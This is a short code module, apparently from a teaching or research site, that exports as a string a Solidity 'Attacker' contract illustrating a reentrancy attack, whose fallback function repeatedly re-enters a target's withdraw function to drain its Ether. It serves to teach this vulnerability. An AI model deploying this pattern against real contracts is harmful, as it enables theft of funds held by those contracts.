export const Research0602ReentranceExample = `
// Attacker contract
contract Attacker {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    // fallback function (executed when receiving Ether)
    fallback() external payable {
        // malicious reentry
        if (address(vulnerable).balance > 0) {
            Vulnerable(vulnerable).withdraw();
        }
    }

    function attack() public payable {
        Vulnerable(vulnerable).deposit{value: msg.value}();
        Vulnerable(vulnerable).withdraw();
    }
}
`